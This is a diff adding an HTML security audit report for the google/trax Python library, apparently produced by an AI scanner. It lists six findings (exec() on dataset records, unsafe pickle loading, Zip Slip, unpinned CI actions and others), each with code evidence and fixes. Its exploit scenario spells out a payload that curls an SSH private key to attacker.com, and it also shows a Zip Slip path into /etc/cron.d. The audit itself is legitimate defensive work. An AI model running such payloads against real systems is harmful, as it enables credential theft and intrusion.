@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Security Report - trax</title>
+<style>
+  :root { --critical: #d63031; --high: #e17055; --medium: #fdcb6e; --low: #00b894; --info: #74b9ff; --bg: #0d1117; --surface: #161b22; --surface2: #21262d; --border: #30363d; --text: #c9d1d9; --muted: #8b949e; --accent: #58a6ff; }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', monospace; background: var(--bg); color: var(--text); line-height: 1.6; padding: 2rem; }
+  h1 { font-size: 1.8rem; color: var(--accent); border-bottom: 1px solid var(--border); padding-bottom: 0.75rem; margin-bottom: 1.5rem; }
+  h2 { font-size: 1.3rem; color: var(--text); margin: 2rem 0 1rem; border-left: 3px solid var(--accent); padding-left: 0.75rem; }
+  h4 { font-size: 0.9rem; color: var(--muted); text-transform: uppercase; margin: 1rem 0 0.3rem; }
+  a { color: var(--accent); }
+  .summary-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(140px, 1fr)); gap: 1rem; margin: 1.5rem 0; }
+  .card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 1rem; text-align: center; }
+  .card .num { font-size: 2rem; font-weight: 700; } .card .label { font-size: 0.75rem; color: var(--muted); text-transform: uppercase; }
+  .card.critical { border-color: var(--critical); } .card.critical .num { color: var(--critical); }
+  .card.high { border-color: var(--high); } .card.high .num { color: var(--high); }
+  .card.medium { border-color: var(--medium); } .card.medium .num { color: var(--medium); }
+  .card.low { border-color: var(--low); } .card.low .num { color: var(--low); }
+  .card.info .num { color: var(--info); }
+  .badge { display: inline-block; padding: 0.15rem 0.6rem; border-radius: 12px; font-size: 0.72rem; font-weight: 700; text-transform: uppercase; }
+  .badge-critical { background: var(--critical); color: #fff; } .badge-high { background: var(--high); color: #fff; }
+  .badge-medium { background: var(--medium); color: #1a1a1a; } .badge-low { background: var(--low); color: #fff; }
+  .finding { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; margin: 1.5rem 0; overflow: hidden; }
+  .finding-header { display: flex; align-items: center; gap: 0.75rem; padding: 0.9rem 1.2rem; background: var(--surface2); border-bottom: 1px solid var(--border); }
+  .finding-id { font-size: 0.78rem; color: var(--muted); font-family: monospace; }
+  .finding-title { font-weight: 600; font-size: 1rem; flex: 1; }
+  .finding-body { padding: 1.2rem; }
+  .finding-meta { display: flex; flex-wrap: wrap; gap: 1.5rem; margin-bottom: 1rem; font-size: 0.85rem; }
+  .finding.sev-critical { border-left: 4px solid var(--critical); } .finding.sev-high { border-left: 4px solid var(--high); }
+  .finding.sev-medium { border-left: 4px solid var(--medium); } .finding.sev-low { border-left: 4px solid var(--low); }
+  pre { background: #010409; border: 1px solid var(--border); border-radius: 6px; padding: 1rem; overflow-x: auto; font-size: 0.82rem; margin: 0.5rem 0; }
+  code { font-family: monospace; } p code { background: var(--surface2); padding: 0.1em 0.4em; border-radius: 4px; color: #f8c8c8; }
+  .table-wrap { overflow-x: auto; margin: 1rem 0; }
+  table { width: 100%; border-collapse: collapse; font-size: 0.85rem; }
+  th { background: var(--surface2); color: var(--muted); font-weight: 600; text-transform: uppercase; font-size: 0.72rem; padding: 0.6rem 0.9rem; text-align: left; border-bottom: 2px solid var(--border); }
+  td { padding: 0.55rem 0.9rem; border-bottom: 1px solid var(--border); vertical-align: top; }
+  details { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; margin: 0.8rem 0; }
+  summary { padding: 0.8rem 1.2rem; cursor: pointer; font-weight: 600; font-size: 0.9rem; list-style: none; }
+  details > *:not(summary) { padding: 0 1.2rem 1.2rem; }
+  .report-header { display: flex; justify-content: space-between; flex-wrap: wrap; gap: 1rem; margin-bottom: 2rem; }
+  .report-meta { font-size: 0.83rem; color: var(--muted); line-height: 1.8; } .report-meta strong { color: var(--text); }
+  .risk-banner { padding: 0.5rem 1.4rem; border-radius: 6px; font-weight: 700; font-size: 1.1rem; }
+  .risk-high { background: #e17055; color: #fff; }
+  .section-empty { color: var(--muted); font-style: italic; padding: 1rem 0; }
+  .p0 { color: var(--critical); font-weight: 700; } .p1 { color: var(--high); font-weight: 700; } .p2 { color: var(--medium); font-weight: 700; }
+  footer { margin-top: 3rem; padding-top: 1rem; border-top: 1px solid var(--border); font-size: 0.78rem; color: var(--muted); text-align: center; }
+</style>
+</head>
+<body>
+<h1>&#x1F6E1; Security Vulnerability Report</h1>
+<div class="report-header">
+  <div class="report-meta">
+    <strong>Repository:</strong> <a href="https://github.com/google/trax">https://github.com/google/trax</a><br>
+    <strong>Branch:</strong> master<br>
+    <strong>Languages:</strong> Python<br>
+    <strong>Version:</strong> 1.4.1<br>
+    <strong>Analysis Date:</strong> 2026-03-01<br>
+    <strong>Analyst:</strong> Claude Code Security Scanner
+  </div>
+  <div class="risk-banner risk-high">HIGH RISK</div>
+</div>
+<h2>Executive Summary</h2>
+<div class="summary-grid">
+  <div class="card critical"><div class="num">1</div><div class="label">Critical</div></div>
+  <div class="card high"><div class="num">2</div><div class="label">High</div></div>
+  <div class="card medium"><div class="num">2</div><div class="label">Medium</div></div>
+  <div class="card low"><div class="num">1</div><div class="label">Low</div></div>
+  <div class="card info"><div class="num">0</div><div class="label">Dep CVEs</div></div>
+  <div class="card critical"><div class="num">0</div><div class="label">Dep Confusion</div></div>
+  <div class="card info"><div class="num">0</div><div class="label">Secrets</div></div>
+  <div class="card info"><div class="num">2</div><div class="label">CVE-Eligible</div></div>
+</div>
+<p style="margin:1rem 0;line-height:1.7">Trax is a Python deep-learning library with significant security concerns. The most critical finding is <code>exec()</code> in <code>trax/data/tf_inputs.py</code> executing Python programs from dataset records with <code>globals()</code> context - if an attacker controls the dataset file, arbitrary code execution at training time is possible. Multiple <code>pickle.load()</code> calls on checkpoint files allow deserialization attacks. The CI/CD pipeline uses unpinned action tags and an end-of-life Python version (3.7). The <code>urllib.request.urlretrieve()</code> call downloads model files without hash verification, and extracts ZIP archives without path traversal protection (Zip Slip). Trax appears to be in maintenance mode (last release 1.4.1), increasing risk from unpatched vulnerabilities.</p>
+
+<h2>Confirmed Vulnerabilities</h2>
+
+<div class="finding sev-critical">
+  <div class="finding-header">
+    <span class="badge badge-critical">CRITICAL</span>
+    <span class="finding-title">Arbitrary Code Execution via exec() on Dataset-Derived Python Programs</span>
+    <span class="finding-id">TRAX-001</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> trax/data/tf_inputs.py</span>
+      <span><strong>Lines:</strong> 2262, 2409</span>
+      <span><strong>CVSS v3:</strong> 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)</span>
+      <span><strong>CWE:</strong> CWE-95 (Improper Neutralization of Directives in Dynamically Evaluated Code)</span>
+    </div>
+    <p>The <code>execute_mathqa_program()</code> function (line 2244) and code within the <code>@gin.configurable</code> <code>CreateMathQAInputs()</code> function (line 2409) call Python's built-in <code>exec()</code> to execute arbitrary Python code assembled from dataset records. The <code>program</code> argument comes from a MathQA dataset file path (<code>dataset_path</code>) which is user-configurable via gin config. The call passes <code>globals()</code> as the execution context, giving executed code access to all imported modules including <code>os</code>, <code>subprocess</code>, <code>tf</code>. The bare <code>except:</code> clause silently swallows exceptions, masking exploitation.</p>
+    <h4>Evidence</h4>
+    <pre># trax/data/tf_inputs.py, lines 2244-2270
+def execute_mathqa_program(problem, program):
+  program = '\n'.join(program)   # program assembled from dataset file records
+  var_dict = {}
+  try:
+    exec(program, globals(), var_dict)  # CRITICAL: full globals() context
+    if 'answer' in var_dict and is_number(var_dict['answer']):
+      return float(var_dict['answer'])
+    else:
+      return None
+  except:  # bare except silently swallows all errors including security exceptions
+    return None
+
+# Line 2409 (inside CreateMathQAInputs, also @gin.configurable):
+exec(target_values, globals(), var_dict)  # same pattern, assembled from dataset</pre>
+    <h4>Exploit Scenario</h4>
+    <p>An attacker places a crafted MathQA-format dataset file at the <code>dataset_path</code> gin config path containing: <code>{"programs": ["import subprocess; subprocess.run(['curl','https://attacker.com/?k='+open('/root/.ssh/id_rsa').read()])"]}</code>. When training runs, the exec fires and executes arbitrary code in the training environment with access to GPU clusters, model weights, and cloud credentials.</p>
+    <h4>Remediation</h4>
+    <p>Replace <code>exec()</code> with a restricted MathQA DSL interpreter. For arithmetic operations, use <code>ast.literal_eval()</code> for constants or implement a whitelist-based expression evaluator. If exec is unavoidable, use a sandboxed subprocess with resource limits and no globals access.</p>
+  </div>
+</div>
+
+<div class="finding sev-high">
+  <div class="finding-header">
+    <span class="badge badge-high">HIGH</span>
+    <span class="finding-title">Unsafe Deserialization via pickle.load() on Checkpoint Files</span>
+    <span class="finding-id">TRAX-002</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>Files:</strong> trax/supervised/training.py (L1258, L1261), trax/layers/base.py (L333), trax/rl/training.py (L154), trax/data/inputs.py (L1115)</span>
+      <span><strong>CVSS v3:</strong> 8.8 (AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)</span>
+      <span><strong>CWE:</strong> CWE-502</span>
+    </div>
+    <p>Trax uses <code>pickle.load(f)</code> to deserialize model checkpoints, layer weights, and training state from user-controlled output directories. Python pickle deserialization can execute arbitrary code via <code>__reduce__</code> methods. An attacker who can write a malicious <code>.pkl.gz</code> file to the checkpoint directory (via compromised storage bucket, shared NFS, or malicious GCS path) achieves arbitrary code execution when training resumes.</p>
+    <h4>Evidence</h4>
+    <pre># trax/supervised/training.py, lines 1253-1265
+def unpickle_from_file(file_path, gzip=False):
+  with tf.io.gfile.GFile(file_path, 'rb') as f:
+    if not gzip:
+      obj = pickle.load(f)      # No source validation
+    else:
+      with gzip_lib.GzipFile(fileobj=f) as gzipf:
+        obj = pickle.load(gzipf) # Same pattern with gzipped checkpoints
+  return obj
+
+# trax/layers/base.py, line 333 (model weights checkpoint)
+with gzip.GzipFile(fileobj=f) as gzipf:
+    dictionary = pickle.load(gzipf)</pre>
+    <h4>Remediation</h4>
+    <p>Replace pickle with numpy <code>.npy</code>/<code>.npz</code> for arrays and JSON for metadata. If pickle must remain for legacy, add HMAC-SHA256 signature verification of checkpoint files before deserialization. Document that checkpoint directories must be trusted sources.</p>
+  </div>
+</div>
+
+<div class="finding sev-high">
+  <div class="finding-header">
+    <span class="badge badge-high">HIGH</span>
+    <span class="finding-title">Zip Slip: Path Traversal in Model Download and Extraction (bert.py)</span>
+    <span class="finding-id">TRAX-003</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> trax/models/research/bert.py</span>
+      <span><strong>Lines:</strong> 237-249</span>
+      <span><strong>CVSS v3:</strong> 7.5 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N)</span>
+      <span><strong>CWE:</strong> CWE-22 (Path Traversal / Zip Slip)</span>
+    </div>
+    <p>The <code>PretrainedBERT.download_model()</code> method downloads a ZIP archive and extracts it using <code>zipfile.ZipFile.extractall()</code> without validating member paths. <code>extractall()</code> is documented as vulnerable to Zip Slip. A malicious ZIP containing entries like <code>../../etc/cron.d/evil</code> can escape the extraction directory to arbitrary filesystem paths. The download URL comes from a hardcoded GCS bucket, but if GCS is misconfigured or a MITM occurs, a malicious ZIP can be delivered.</p>
+    <h4>Evidence</h4>
+    <pre># trax/models/research/bert.py, lines 237-249
+urllib.request.urlretrieve(model_link, download_path)
+...
+with zipfile.ZipFile(download_path, 'r') as zip_ref:
+  zip_ref.extractall(download_dir)  # No path validation - Zip Slip vulnerable!</pre>
+    <h4>Remediation</h4>
+    <pre>def safe_extract(zip_path, extract_dir):
+    import os, zipfile
+    with zipfile.ZipFile(zip_path, 'r') as zf:
+        for member in zf.infolist():
+            target = os.path.realpath(os.path.join(extract_dir, member.filename))
+            if not target.startswith(os.path.realpath(extract_dir) + os.sep):
+                raise ValueError(f"Zip Slip: {member.filename}")
+        zf.extractall(extract_dir)</pre>
+    <p>Also add SHA256 verification of the downloaded ZIP against a known-good hash stored in <code>_MODEL_LINKS</code>.</p>
+  </div>
+</div>
+
+<div class="finding sev-medium">
+  <div class="finding-header">
+    <span class="badge badge-medium">MEDIUM</span>
+    <span class="finding-title">CI/CD: Unpinned GitHub Actions and EOL Python 3.7</span>
+    <span class="finding-id">TRAX-004</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> .github/workflows/build.yaml</span>
+      <span><strong>CVSS v3:</strong> 5.9 (AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N)</span>
+      <span><strong>CWE:</strong> CWE-829, CWE-1104</span>
+    </div>
+    <p>The trax CI workflow uses <code>actions/checkout@v2</code> and <code>actions/setup-python@v2</code> without commit-hash pinning (tag mutation attack vector). The Python matrix is pinned to version 3.7 (EOL June 2023), and TensorFlow to 2.4.x (EOL). No security patches are available for Python 3.7 vulnerabilities.</p>
+    <pre># .github/workflows/build.yaml
+    - uses: actions/checkout@v2          # unpinned tag
+    - uses: actions/setup-python@v2      # unpinned tag
+      matrix:
+        python-version: [3.7]            # EOL since June 2023
+        tf-version: ["2.4.*"]            # TF 2.4 EOL</pre>
+    <h4>Remediation</h4>
+    <p>Pin actions to SHA hashes. Update Python version matrix to 3.10+. Update TensorFlow to a supported version. Add <code>python_requires='&gt;=3.10'</code> to setup.py.</p>
+  </div>
+</div>
+
+<div class="finding sev-medium">
+  <div class="finding-header">
+    <span class="badge badge-medium">MEDIUM</span>
+    <span class="finding-title">Model Download Without Hash Verification (bert.py)</span>
+    <span class="finding-id">TRAX-005</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> trax/models/research/bert.py line 237</span>
+      <span><strong>CVSS v3:</strong> 4.8 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:H/A:N)</span>
+      <span><strong>CWE:</strong> CWE-494</span>
+    </div>
+    <p><code>urllib.request.urlretrieve(model_link, download_path)</code> downloads model weights without verifying SHA256 hash of the downloaded artifact. Combined with the Zip Slip issue (TRAX-003), this creates a complete exploit chain from network position to arbitrary code execution.</p>
+    <h4>Remediation</h4>
+    <p>Store expected SHA256 hashes in <code>_MODEL_LINKS</code> and verify after download before extraction.</p>
+  </div>
+</div>
+
+<div class="finding sev-low">
+  <div class="finding-header">
+    <span class="badge badge-low">LOW</span>
+    <span class="finding-title">Unpinned Open-Ended Dependency Ranges in setup.py</span>
+    <span class="finding-id">TRAX-006</span>
+  </div>
+  <div class="finding-body">
+    <div class="finding-meta">
+      <span><strong>File:</strong> setup.py</span>
+      <span><strong>CVSS v3:</strong> 3.7 (AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N)</span>
+      <span><strong>CWE:</strong> CWE-1357</span>
+    </div>
+    <p>All dependencies in <code>setup.py</code> use open-ended version ranges (e.g., <code>'jax'</code>, <code>'tensorflow&gt;=1.15.0'</code>). This allows installation of vulnerable future versions without any pinning. There is no <code>requirements.txt</code> with pinned versions in the repository root.</p>
+    <h4>Remediation</h4>
+    <p>Add a <code>requirements.txt</code> with pinned versions for reproducible installs. Run <code>pip-audit</code> in CI to detect known CVEs in the dependency tree.</p>
+  </div>
+</div>
+
+<h2>&#x1F4E6; Dependency Confusion</h2>
+<p class="section-empty">Not applicable. Trax is a Python package. PyPI package name <code>trax</code> is owned by Google. No npm dependencies or private registry configuration found.</p>
+
+<h2>Known Dependency CVEs</h2>
+<p class="section-empty">No requirements.txt with pinned versions found. Open-ended version ranges in setup.py prevent static CVE analysis. Key concern: <code>tensorflow&gt;=1.15.0</code> is extremely broad and could install TF 1.x which has numerous CVEs. Full CVE scan requires a resolved virtual environment via pip-audit. Recommend running pip-audit in CI.</p>
+
+<h2>&#x1F511; Hardcoded Secrets</h2>
+<p class="section-empty">No hardcoded secrets found in the 198 Python files scanned. The GCS URL in bert.py is a public bucket, not a credential.</p>
+
+<h2>Patterns Investigated but Excluded</h2>
+<div class="table-wrap"><table>
+<thead><tr><th>Pattern Found</th><th>Reason Excluded</th></tr></thead>
+<tbody>
+  <tr><td><code>pickle.dump()</code> in multiple files</td><td>Write operations are not exploitable. Only pickle.load() is a deserialization risk (TRAX-002).</td></tr>
+  <tr><td><code>urllib.request.urlretrieve()</code> uses HTTPS</td><td>Standard certificate validation applies. Not a verify=False issue. Classified as integrity concern (TRAX-005).</td></tr>
+  <tr><td><code>@gin.configurable</code> throughout codebase</td><td>Gin configs are operator-controlled, not user-controlled in normal deployment. Gin injection via config file is a deployment-time concern, not a code vulnerability.</td></tr>
+  <tr><td>TRAX_TEST in shell: <code>TRAX_TEST=" ${{matrix.trax-test}}"</code></td><td>The matrix value is hardcoded in the workflow YAML, not user-controlled. No injection possible.</td></tr>
+</tbody>
+</table></div>
+
+<h2>Remediation Priority</h2>
+<div class="table-wrap"><table>
+<thead><tr><th>Priority</th><th>Finding</th><th>Effort</th></tr></thead>
+<tbody>
+  <tr><td><span class="p0">P0</span></td><td>TRAX-001: Replace exec() with safe MathQA DSL interpreter</td><td>High</td></tr>
+  <tr><td><span class="p1">P1</span></td><td>TRAX-002: Replace pickle.load() with safe serialization for checkpoints</td><td>High</td></tr>
+  <tr><td><span class="p1">P1</span></td><td>TRAX-003: Fix Zip Slip in bert.py with path validation before extractall()</td><td>Low</td></tr>
+  <tr><td><span class="p2">P2</span></td><td>TRAX-004: Pin CI actions to commit hashes; update Python to 3.10+</td><td>Low-Medium</td></tr>
+  <tr><td><span class="p2">P2</span></td><td>TRAX-005: Add SHA256 verification for model downloads</td><td>Low</td></tr>
+  <tr><td>P3</td><td>TRAX-006: Add requirements.txt with pinned deps; run pip-audit in CI</td><td>Low</td></tr>
+</tbody>
+</table></div>
+
+<details><summary>Methodology</summary><p>Sparse git clone (filter=tree:0) of google/trax. All 198 Python files fetched via git cat-file -p and scanned for: pickle.load, yaml.load, subprocess, os.system, os.popen, eval(), exec(), requests.get, verify=False, urllib.request, hashlib.md5/sha1. The build.yaml GitHub Actions workflow read in full. setup.py analyzed for dependency constraints. 5-gate exploitability check applied to all candidates.</p></details>
+<footer>Generated by Claude Code Security Scanner &mdash; 2026-03-01 &mdash; For authorized use only.</footer>
+</body>
+</html>
